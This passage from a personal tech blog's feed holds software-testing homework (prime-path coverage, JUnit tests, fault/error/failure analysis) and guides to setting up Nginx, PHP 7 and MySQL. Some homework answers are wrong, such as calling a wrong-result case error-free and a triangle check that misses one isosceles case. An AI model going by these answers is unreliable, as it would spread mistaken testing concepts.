coverage</p><blockquote><p>{(1,2,3,4,5,6,7),<br>(1,2,3,4,5,6,8,9,10,11),<br>(1,2,3,4,5,6,8,9,11),<br>(1,2,3,4,5,9,10,11),<br>(1,2,3,4,5,9,11),<br>(1,2,12,13,14,15),<br>(1,2,12,16),<br>(2,3,4,5,6,8,9,10,11,2),<br>(2,3,4,5,6,8,9,11,2),<br>(2,3,4,5,9,10,11,2),<br>(2,3,4,5,9,11,2),<br>(3,4,5,6,8,9,10,11,2,12,13,14,15),<br>(3,4,5,6,8,9,11,2,12,13,14,15),<br>(3,4,5,6,8,9,10,11,2,12,13,16),<br>(3,4,5,6,8,9,11,2,12,13,16),<br>(3,4,5,9,10,11,2,12,13,14,15),<br>(3,4,5,9,11,2,12,13,14,15),<br>(3,4,5,9,10,11,2,12,13,16),<br>(3,4,5,9,11,2,12,13,16),<br>(5,6,7,5),<br>(6,7,5,9,10,11,2,12,13,14,15),<br>(6,7,5,9,11,2,12,13,14,15),<br>(6,7,5,9,10,11,2,12,13,16),<br>(6,7,5,9,11,2,12,13,16),<br>(13,14,15,13),<br>(14,15,13,16)}</p></blockquote><h5 id="e-Design-a-test-case-to-coverage-prime-path-using-JUnit"><a href="#e-Design-a-test-case-to-coverage-prime-path-using-JUnit" class="headerlink" title="e) Design a test case to coverage prime path using JUnit."></a>e) Design a test case to coverage prime path using JUnit.</h5><p>Main.java</p><pre><code>public class Main {    private static final int MAXPRIMES = 5;    public static void main(String args[]){        printPrimes(5);    }    private static boolean isDivisible(int a, int b){        if(b % a == 0)            return true;        return false;    }    public static int[] printPrimes (int n){        int curPrime;        // Value currently considered for primeness        int numPrimes;        // Number of primes found so far.        boolean isPrime;    // Is curPrime prime?        int [] primes = new int [MAXPRIMES]; // The list of prime numbers.        // Initialize 2 into the list of primes.        primes[0] = 2;        numPrimes = 1;        curPrime = 2;        while(numPrimes &lt; n){            curPrime++;        //next number to consider ...            isPrime = true;            for(int i = 0; i &lt;= numPrimes-1; i++){                if(isDivisible(primes[i], curPrime)){                    isPrime = false;                    break;                }            }            if(isPrime){                primes[numPrimes] = curPrime;                numPrimes++;            }        } // end while        //Print all the primes out.        for(int i = 0; i &lt;= numPrimes-1; i ++){            System.out.println(&quot;Prime: &quot;+ primes[i]);        }        return primes;    } // end printPrimes}</code></pre><p>MainTest.java</p><pre><code>import org.junit.Test;import static org.junit.Assert.*;/** * Created by hardy on 17-3-15. */public class MainTest {    @Test    public void printPrimes() throws Exception {        int [] a = new int [] {2, 3, 5, 7, 11};        assertArrayEquals(a, Main.printPrimes(5));    }}</code></pre><p><img src="/images/2017-3-15-00-15.png" alt="pictures"></p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;书上的练习题，要求设计相应的测试用例，写出主路径覆盖&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#problem&quot;&gt;Problem Description&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#answer&quot;&gt;Answer&lt;/a&gt;&lt;!--mo--&gt;
&lt;/li&gt;
&lt;
      
    
    </summary>
    
      <category term="作业" scheme="https://blog.liebes.top/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="软件测试作业" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 本地虚拟主机搭建</title>
    <link href="https://blog.liebes.top/2017/03/13/lemp-vhost/"/>
    <id>https://blog.liebes.top/2017/03/13/lemp-vhost/</id>
    <published>2017-03-13T23:34:02.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>之前每次都死在这里，这把终于搞明白了。<br>弄个虚拟主机的目的是将多个项目都可以跑在虚拟域名的根目录下，在本地调试结构也比较清晰。</p><hr><p>首先备份一份 default 配置文件</p><pre><code>$ sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/default.bak</code></pre><p>接下来以example.com域名为例</p><pre><code>$ sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/example.com.conf</code></pre><p>修改新的配置文件的内容</p><pre><code>server {    listen 80;    listen [::]:80;    server_name example.com;    root /var/www/example.com;    index index.html index.php;    location / {        try_files $uri $uri/ =404;    }    location ~ \.php$ {        include snippets/fastcgi-php.conf;        fastcgi_pass 127.0.0.1:9000;    }    location ~ /\.ht {        deny all;    }}</code></pre><p>这里你需要有对应的工作目录，将配置文件链接到 <code>sites-enabled</code> 中使其生效<br>下面这里要注意了，一定要写绝对路径。</p><pre><code>$ sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/$ sudo systemctl reload nginx</code></pre><p>在hosts文件中加上映射</p><pre><code>$ vi /etc/hosts127.0.0.1 example.com$ sudo /etc/init.d/networking restart</code></pre><p>去浏览器访问 example.com 就可以看到对应的网页了</p><hr><p>之前每次貌似都是在做链接那里死了，因为只要用相对路径，链接不上，也不知道为什么。<br>挽尊</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前每次都死在这里，这把终于搞明白了。&lt;br&gt;弄个虚拟主机的目的是将多个项目都可以跑在虚拟域名的根目录下，在本地调试结构也比较清晰。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;首先备份一份 default 配置文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo cp /etc/nginx/si
      
    
    </summary>
    
      <category term="个人日志" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97/"/>
    
    
      <category term="Nginx" scheme="https://blog.liebes.top/tags/Nginx/"/>
    
      <category term="Vhost" scheme="https://blog.liebes.top/tags/Vhost/"/>
    
  </entry>
  
  <entry>
    <title>【软件测试】JUNIT使用及覆盖测试</title>
    <link href="https://blog.liebes.top/2017/03/10/SoftwareTest-LIB-1/"/>
    <id>https://blog.liebes.top/2017/03/10/SoftwareTest-LIB-1/</id>
    <published>2017-03-10T23:34:01.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>软件测试第一次上机，测试了一下JUnit的使用和覆盖测试，虽然实验要求是用eclipse，但我还是被idea的美色所臣服。</p><ul><li><a href="#junit">Junit 安装与使用</a></li><li><a href="#cover">覆盖测试</a></li></ul><hr><p></p><h2 id="junit">Junit 安装与使用</h2><br>首先去官网下载Junit的jar包和其依赖<p></p><blockquote><p><a href="http://search.maven.org/#search|gav|1|g:&quot;junit&quot; AND a:&quot;junit&quot;" target="_blank" rel="noopener">junit-4.12.jar</a></p></blockquote><blockquote><p><a href="http://search.maven.org/#search|ga|1|g%3Aorg.hamcrest" target="_blank" rel="noopener">hamcrest-core-1.3.jar</a></p></blockquote><p>打开Idea，新建一个项目，并在项目中与src目录平级创建test和lib文件夹，并将下载的jar包放在lib文件夹中<br><img src="/images/2017-3-10-11-55.png" alt="pictures"><br>在idea中导入junit：<code>File&gt;Project Structure&gt;Modules</code> 点击 ‘+’ 引入刚刚下载的jar包，点击 Apply<br><img src="/images/2017-3-10-12-00.png" alt="pictures"><br>将test文件夹设置为测试文件夹<br>在test文件夹右键 &gt; Mark Directory as &gt; Test Resources Root<br>回到Main.java 编写testTriangle方法</p><pre><code>//判断一个三角形的形状：等边，等腰，普通public static String testTriangle(int a, int b, int c){    if(a &lt; 0 || b &lt; 0 || c &lt; 0)        return &quot;illegal input&quot;;    else if (a + b &lt;= c || a + c &lt;= b || b + c &lt;= a)        return &quot;illegal input&quot;;    else if (a == b &amp;&amp; b == c)        return &quot;equilateral&quot;;    else if (a == b || b == c)        return &quot;isosceles&quot;;    else        return &quot;scalene&quot;;}</code></pre><p>Ctrl + Shift + T 或者 Navigate &gt; Test 选择 Creat New Test 成功后会在test目录下生成test类<br>修改testTriangle方法</p><pre><code>@Test    public void testTriangle() throws Exception {        a = 1;        b = 2;        c = 3;        assertEquals(&quot;illegal input&quot;, Main.testTriangle(a, b, c));        a = 2;        b = 5;        c = 5;        assertEquals(&quot;isosceles&quot;, Main.testTriangle(a, b, c));        a = 5;        b = 5;        c = 5;        assertEquals(&quot;equilateral&quot;, Main.testTriangle(a, b, c));        a = 5;        b = 6;        c = 7;        assertEquals(&quot;scalene&quot;, Main.testTriangle(a, b, c));    }</code></pre><p>Ctrl + Shift + F10 运行测试，得到运行结果</p><h2 id><a href="#" class="headerlink" title></a><img src="/images/2017-3-10-17-57.png" alt="pictures"></h2><p></p><h2 id="cover">覆盖测试</h2><br>作业要求的是使用Eclemma，然而Eclemma是Eclipse的插件，idea继承了覆盖测试<br>Run &gt; Run ‘Main’ with Coverage<p></p><h2 id="-1"><a href="#-1" class="headerlink" title></a><img src="/images/2017-3-10-18-03.png" alt="pictures"></h2><p>就这些啦，挽尊。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;软件测试第一次上机，测试了一下JUnit的使用和覆盖测试，虽然实验要求是用eclipse，但我还是被idea的美色所臣服。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#junit&quot;&gt;Junit 安装与使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cover&quot;&gt;覆盖测
      
    
    </summary>
    
      <category term="上机实验" scheme="https://blog.liebes.top/categories/%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="软件测试上机实验" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>Unbuntu16.04 Nginx + php + mysql Web服务器搭建</title>
    <link href="https://blog.liebes.top/2017/03/10/lemp-Ubantu/"/>
    <id>https://blog.liebes.top/2017/03/10/lemp-Ubantu/</id>
    <published>2017-03-10T23:34:00.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>下决心不再用lamp的集成包了，自己搞一个出来。</p><ul><li><a href="#nginx">Nginx</a></li><li><a href="#php">php</a></li><li><a href="#mysql">mysql</a></li></ul><hr><p></p><h2 id="nginx">Nginx</h2><br>首先安装使用 apt 安装nginx<br>$ sudo apt install nginx<br>然而由于之前安装过nginx，卸载还不干净，导致配置文件读取失败，出现错误：<p></p><pre><code>Job for nginx.service failed because the control process exited with error code. See &quot;systemctl status nginx.service&quot; and &quot;journalctl -xe&quot; for details.invoke-rc.d: initscript nginx, action &quot;start&quot; failed.● nginx.service - A high performance web server and a reverse proxy server   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)   Active: failed (Result: exit-code) since 四 2017-03-09 00:06:13 CST; 7ms ago  Process: 4540 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=1/FAILURE)3月 09 00:06:13 hardy-Inspiron-5547 systemd[1]: Starting A high performance....3月 09 00:06:13 hardy-Inspiron-5547 nginx[4540]: nginx: [emerg] open() &quot;/etc...3月 09 00:06:13 hardy-Inspiron-5547 nginx[4540]: nginx: configuration file /...3月 09 00:06:13 hardy-Inspiron-5547 systemd[1]: nginx.service: Control proc...13月 09 00:06:13 hardy-Inspiron-5547 systemd[1]: Failed to start A high perf....3月 09 00:06:13 hardy-Inspiron-5547 systemd[1]: nginx.service: Unit entered....3月 09 00:06:13 hardy-Inspiron-5547 systemd[1]: nginx.service: Failed with ....Hint: Some lines were ellipsized, use -l to show in full.dpkg: 处理软件包 nginx-core (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 1dpkg: 依赖关系问题使得 nginx 的配置工作不能继续： nginx 依赖于 nginx-core (&gt;= 1.10.0-0ubuntu0.16.04.4) | nginx-full (&gt;= 1.10.0-0ubuntu0.16.04.4) | nginx-light (&gt;= 1.10.0-0ubuntu0.16.04.4) | nginx-extras (&gt;= 1.10.0-0ubuntu0.16.04.4)；然而：  软件包 nginx-core 尚未配置。  未安装软件包 nginx-full。  未安装软件包 nginx-light。  未安装软件包 nginx-extras。 nginx 依赖于 nginx-core (&lt;&lt; 1.10.0-0ubuntu0.16.04.4.1~) | nginx-full (&lt;&lt; 1.10.0-0ubuntu0.16.04.4.1~) | nginx-light (&lt;&lt; 1.10.0-0ubuntu0.16.04.4.1~) | nginx-extras (&lt;&lt; 1.10.0-0ubuntu0.16.04.4.1~)；然而：  软件包 nginx-core 尚未配置。  未安装软件包 nginx-full。  未安装软件包 nginx-light。  未安装软件包 nginx-extras。dpkg: 处理软件包 nginx (--configure)时出错： 依赖关系问题 - 仍未被配置在处理时有错误发生： nginx-core nginxE: Sub-process /usr/bin/dpkg returned an error code (1)</code></pre><p>在报错信息中可以看到配置文件读取失败，当然这个错误也有可能是因为apache占用了80端口</p><pre><code># 如果是apache占用端口的话$ systemctl stop apache2# 如果是东西没删干净的话，我的问题是这个$ sudo apt-get purge nginx nginx-common nginx-full</code></pre><p>解决之后启动nginx服务，并设置开机启动</p><pre><code># 输入完，在本地打 127.0.0.1 已经可以访问了，然而在设置开机启动的时候又炸了$ systemctl start nginx$ systemctl enable nginx</code></pre><p>然而自家系统又报错了：</p><pre><code>Synchronizing state of nginx.service with SysV init with /lib/systemd/systemd-sysv-install...Executing /lib/systemd/systemd-sysv-install enable nginxsh: 0: getcwd() failed: No such file or directoryinsserv: pushd() can not change to directory /etc/init.d: No such file or directoryupdate-rc.d: error: insserv rejected the script header</code></pre><p>结果原因是因为我当前的工作目录已经被删除了，所以……<br>成功后，访问 127.0.0.1 会看到nginx的欢迎界面</p><h2 id><a href="#" class="headerlink" title></a><img src="/images/welcomeToNginx.png" alt="pictures"></h2><p></p><h2 id="php">编译安装PHP7</h2><br>首先下载php7的源码：<a href="http://php.net/get/php-7.0.9.tar.gz/from/a/mirror" target="_blank" rel="noopener">链接</a>然后安装需要的依赖<p></p><pre><code>$ sudo apt-get update$ sudo apt-get install libxml2-dev# 安装gcc$ sudo apt-get install build-essential$ sudo apt-get install openssl$ sudo apt-get install libssl-dev$ sudo apt-get install make$ sudo apt-get install curl$ sudo apt-get install libcurl4-gnutls-dev$ sudo apt-get install libjpeg-dev$ sudo apt-get install libpng-dev$ sudo apt-get install libmcrypt-dev$ sudo apt-get install libreadline6 libreadline6-dev</code></pre><p>解压下载好的php文件</p><pre><code>$ sudo tar -zxf /tmp/php-7.0.9.tar.gz$ cd php-7.0.9</code></pre><p>编译安装（这里需要好一会儿时间）</p><pre><code>$ sudo ./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-mysqli --with-pdo-mysql --with-iconv-dir --with-freetype-dir --with-jpeg-dir --with-png-dir --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --with-curl --enable-mbregex --enable-mbstring --with-mcrypt --enable-ftp --with-gd --enable-gd-native-ttf --with-openssl --with-mhash --enable-pcntl --enable-sockets --with-xmlrpc --enable-zip --enable-soap --without-pear --with-gettext --disable-fileinfo --enable-maintainer-zts$ sudo make &amp;&amp; sudo make install</code></pre><p>安装结束后，需要配置一下php的配置文件</p><pre><code>$ cd /usr/local/php/etc$ sudo cp php-fpm.conf.default php-fpm.conf$ cd /usr/local/php/etc/php-fpm.d$ sudo cp www.conf.default www.conf# 打开www.conf文件可以看到 user 和 group 默认设置为 www# 如果www用户不存在，那么先添加www用户$ sudo groupadd www$ sudo useradd -g www -s /bin/nologin www</code></pre><p>在 <code>/etc/profile</code> 文件末尾加上：</p><pre><code>PATH=$PATH:/usr/local/php/binexport# 输入$ source /etc/profile</code></pre><p>验证php安装情况并启动</p><pre><code>$ php -v$ sudo /usr/local/php/sbin/php-fpm</code></pre><p>配置nginx配置与php配置</p><pre><code># 我们可以发现/usr/local/php/etc 下面是没有php.ini文件的，这个文件可以在你的源码目录下找到，有个 php.ini.development 的文件$ sudo cp php.ini.development /usr/local/php/etc/php.ini# 打开ini文件，作如下修改cgi.fix_pathinfo=0# 修改nginx配置文件 /etc/nginx/sites-available/defaultserver {    listen 80 default_server;    listen [::]:80 default_server;    root /var/www/html;    index index.html index.htm index.nginx-debian.html index.php;    server_name server_domain_or_IP;    location / {        try_files $uri $uri/ =404;    }    location ~ \.php$ {        include snippets/fastcgi-php.conf;        fastcgi_pass 127.0.0.1:9000;    }    location ~ /\.ht {        deny all;    }}</code></pre><p>重新启动 nginx 并测试</p><pre><code>$ sudo systemctl reload nginx$ sudo vi /var/www/html/test.php&lt;?php    echo phpinfo();?&gt;</code></pre><h2 id="-1"><a href="#-1" class="headerlink" title></a><img src="/images/phpinfo.png" alt="picture"></h2><p></p><h2 id="mysql">安装MYSQL</h2><br>通过 apt 安装mysql，根据提示自定义mysql<p></p><pre><code>$ sudo apt-get install mysql-server</code></pre><hr><p>至此，lemp的环境就搭建完了，下一篇文章海痴会搞一搞 vhost</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;下决心不再用lamp的集成包了，自己搞一个出来。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#nginx&quot;&gt;Nginx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#php&quot;&gt;php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mysql&quot;&gt;mysql&lt;/a&gt;&lt;/li&gt;
      
    
    </summary>
    
      <category term="个人日记" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="Nginx" scheme="https://blog.liebes.top/tags/Nginx/"/>
    
      <category term="web server" scheme="https://blog.liebes.top/tags/web-server/"/>
    
      <category term="Lemp" scheme="https://blog.liebes.top/tags/Lemp/"/>
    
  </entry>
  
  <entry>
    <title>【软件测试】作业2 设计测试用例</title>
    <link href="https://blog.liebes.top/2017/02/26/SoftwareTest-HW-2/"/>
    <id>https://blog.liebes.top/2017/02/26/SoftwareTest-HW-2/</id>
    <published>2017-02-26T23:34:02.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>软件测试课程作业，按照要求设计相关的测试用例</p><ul><li><a href="#problem">问题描述</a></li><li><a href="#answer">问题解答</a></li></ul><hr><h2 id="problem">问题描述</h2><blockquote><p>Below are two faulty programs. Each includes a test case that results in failure. Answer the following questions about each program.</p><pre><code>// program 1public int findLast (int[] x, int y) {//Effects: If x==null throw NullPointerException// else return the index of the last element// in x that equals y.// If no such element exists, return -1  for (int i=x.length-1; i &gt; 0; i--){  if (x[i] == y){    return i;  }}return -1;}/ test: x=[2, 3, 5]; y = 2/ Expected = 0</code></pre><pre><code>// program 2public static int lastZero (int[] x) {// Effects: if x==null throw NullPointerException// else return the index of the LAST 0 in x.// Return -1 if 0 does not occur in xfor (int i = 0; i &lt; x.length; i++){  if (x[i] == 0){    return i;  }}return -1;}// test: x=[0, 1, 0]// Expected = 2</code></pre></blockquote><h4 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h4><ul><li>Identify the fault.</li><li>If possible, identify a test case that does not execute the fault. (Reachability)</li><li>If possible, identify a test case that executes the fault, but does not result in an error state.</li><li>If possible identify a test case that results in an error, but not a failure.</li></ul><hr><p></p><h2 id="answer">问题解答</h2><p></p><ul><li>program 1<ul><li>程序1中循环体内，变量<code>i</code>应从<code>x.length</code>遍历到<code>0</code>，也就是说，<code>for (int i=x.length-1; i &gt; 0; i--)</code> 这一行应当改为<code>for (int i=x.length-1; i &gt;= 0; i--)</code></li><li>test: <code>x = [1, 2, 3]; y = 3;</code> 程序会返回<code>2</code>，且程序会在第一次循环时结束，不会执行到 fault 处</li><li>test: <code>x = [1, 2, 3]; y = 1;</code> 由于程序没有查询位置<code>0</code>，因此会返回<code>-1</code>，程序循环了两次，执行到了fault处，但没有导致错误状态</li><li>test: <code>x = [1, 2, 3]; y = 6;</code> 由于<code>x</code>中没有<code>y</code>，因此会返回<code>-1</code>，是正确结果，但确实在第三次迭代时发生了错误</li></ul></li><li>program 2<ul><li>程序2中循环体内，变量i应当从后向前遍历，应将<code>for (int i = 0; i &lt; x.length; i++)</code>这一行改为<code>for (int i = x.length - 1; i &gt;= 0; i--)</code></li><li>test: <code>x = [0];</code> 程序会返回<code>0</code>，由于x只有一个元素，从前向后与从后向前没有差别，因此没有执行 fault</li><li>test: <code>x = [0, 1, 0];</code> 程序会返回错误结果<code>0</code>，但并没有导致错误状态</li><li>test: <code>x = [1, 0, 1];</code> 程序返回了正确结果<code>1</code>，但在第一次与第二次迭代时发生了错误。</li></ul><hr>应当明确三个词语 <code>fault</code> <code>error</code> <code>failure</code> 之间的差别，然而海痴并不是很懂，欢迎大神在下面指出错误，并帮忙分析一下这三个“错误”差别在哪里</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;软件测试课程作业，按照要求设计相关的测试用例&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#problem&quot;&gt;问题描述&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#answer&quot;&gt;问题解答&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&quot;problem&quot;&gt;问题描述
      
    
    </summary>
    
      <category term="作业" scheme="https://blog.liebes.top/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="软件测试作业" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
</feed>
